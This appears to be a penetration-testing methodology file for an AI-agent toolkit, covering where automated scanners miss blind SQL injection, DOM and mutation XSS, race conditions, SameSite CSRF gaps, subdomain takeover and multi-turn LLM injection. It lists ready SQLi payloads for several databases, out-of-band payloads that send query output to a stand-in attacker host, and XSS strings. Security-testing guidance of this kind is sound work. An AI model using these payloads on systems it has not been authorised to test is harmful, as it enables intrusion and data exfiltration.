---
name: detection-blind-spots
description: Known weak spots in automated scanners — blind SQLi, DOM XSS, multi-turn LLM injection, mutation XSS
tags: [methodology, scanner-limitations, blind-sqli, dom-xss, mutation-xss, manual-testing]
source: Penligent Local methodology
---

# Detection Blind Spots — Where Automation Fails

> Automated AI agents and scanners have near-zero detection rate on these classes. Always pair scanner output with the listed manual technique.

## Blind SQL Injection (Time-Based)

**Automated detection rate**: near zero. Most AI agents and scanners miss it entirely.

Manual probe — run AFTER `sqli_detect` returns no result:

```
Original:        GET /api/products?id=42
Time-based test: GET /api/products?id=42' AND SLEEP(5)-- -
                 → measure response latency
```

Then compare against the control:

| Variant | Expected latency | Conclusion |
|---------|------------------|------------|
| `id=42` (control) | ~50 ms | baseline |
| `id=42' AND SLEEP(5)-- -` | ~5050 ms | **Confirmed time-based blind SQLi** |
| `id=42' AND SLEEP(0)-- -` | ~50 ms | Confirms it's the SLEEP and not network noise |

DB-specific variants:

| DB | Payload |
|----|---------|
| MySQL / MariaDB | `' AND SLEEP(5)-- -` |
| PostgreSQL | `'; SELECT pg_sleep(5)-- -` |
| MSSQL | `'; WAITFOR DELAY '0:0:5'-- -` |
| Oracle | `' AND DBMS_PIPE.RECEIVE_MESSAGE('a',5) = 'a'-- -` |
| SQLite | `' AND randomblob(100000000)-- -` (CPU-bound delay) |

**Do NOT conclude not-vulnerable without this manual time-based step.** AI agents that skip this miss 90%+ of blind SQLi.

## Blind SQLi — Out-of-Band (OOB)

When time-based is unreliable (jittery network):

```
MySQL:      ' AND LOAD_FILE(CONCAT('\\\\', (SELECT @@version), '.attacker.tld\\a'))-- -
MSSQL:      '; EXEC master..xp_dirtree '\\<base64>.<attacker>\a'-- -
Oracle:     ' AND UTL_HTTP.REQUEST('http://<output>.<attacker>/')-- -
```

Set up `interactsh` or Burp Collaborator listener; confirm the DB process makes the callback.

## DOM-Based XSS

`xss_probe` and most scanners only find **reflected** XSS via response-body inspection. DOM XSS executes entirely in the browser via `document.write`, `eval`, `innerHTML`, `location.hash`, `postMessage` — the server response is innocent.

Manual workflow after automated `xss_probe`:

1. Run `csp_audit` — note if CSP is missing or has `unsafe-eval`.
2. Identify DOM sinks in the JS bundle:
   ```
   grep -RE "innerHTML|outerHTML|document.write|eval\(|setTimeout\(.*,|setInterval\(.*,|location\.\w+ = " bundle.js
   ```
3. Trace sources → sinks: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage` data
4. Test payloads through the source:
   ```
   #<img src=x onerror=alert(1)>
   #javascript:alert(1)
   ?q=<svg onload=alert(1)>
   ```
5. If the sink is `innerHTML` and the input flows through any `JSON.parse` or `.split()` first — try the matching DOM XSS payload (XSS Mario cheat sheet).

## Mutation XSS (mXSS)

mXSS triggers when the browser's HTML parser re-serializes sanitized markup into XSS:

```
Input:    <listing>&lt;img src=x onerror=alert(1)&gt;</listing>
After parser: <listing><img src=x onerror=alert(1)></listing>
            → XSS fires
```

Test surfaces:
- Rich-text comment/post inputs where the server sanitizes via a regex
- Markdown renderers that allow specific HTML tags
- Email-preview features that wrap content in `<table>` / `<style>` contexts

Tools: DOMPurify bypass payload list (community-maintained), MentalJS, ToothPick.

## Multi-Turn LLM Context Execution

A single-turn LLM injection scanner (most "AI red-team" tools) tests one prompt at a time. Real attackers gradually shift context across many turns.

Manual probe — see [[llm-attack-surface]] step 2.

## Race Conditions

Automated scanners assume sequential request/response. Race conditions need parallel requests:

| Class | Test |
|-------|------|
| Gift-card double-redeem | Burp Turbo Intruder / `requests` async — send 50 redeem-code POSTs simultaneously |
| Account balance race | Parallel withdrawal requests across two sessions of the same user |
| MFA enrollment race | Concurrent MFA setup + critical-action requests |

Set up parallel requests with shared cookie/token; look for inconsistent state in the response.

## CSRF + SameSite Edge Cases

`SameSite=Lax` blocks cookie sending on cross-origin sub-resource requests **except**:
- Top-level navigations with GET (`<a href=...>`, `<form method=GET>`)
- The first 2 minutes after a cookie is set (Chrome's "Lax + POST" exception)

Test surfaces:
- State-changing endpoint accepting **GET** → SameSite=Lax bypass via top-level GET
- Sensitive operation within 2 minutes of login → potential POST-via-Lax window

## Subdomain Takeover

Easy to miss because the scanner sees a `NXDOMAIN` / `200 OK Bucket not found` and flags nothing.

Manual probe:

```bash
# Pull all subdomains from CT logs
curl 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u

# Check each for dangling CNAME
for s in $(cat subs.txt); do
  cname=$(dig +short CNAME "$s")
  if [ -n "$cname" ] && ! dig +short "$cname" > /dev/null; then
    echo "DANGLING: $s → $cname"
  fi
done
```

Confirm against the [Subdomain Takeover Fingerprint List](https://github.com/EdOverflow/can-i-take-over-xyz) for each cname target's takeover potential.

## Why These Matter

A pen-test report listing only "automated scan results" misses the highest-impact findings. Every engagement should explicitly run these manual probes — and document the **negative** result (no vuln found) as evidence of due diligence.

## Cross-Reference

- [[evidence-first]] — every manual finding needs the same five-field evidence
- [[waf-bypass]] — combine with WAF bypass when the manual payload returns 403
- [[llm-attack-surface]] — multi-turn context execution methodology
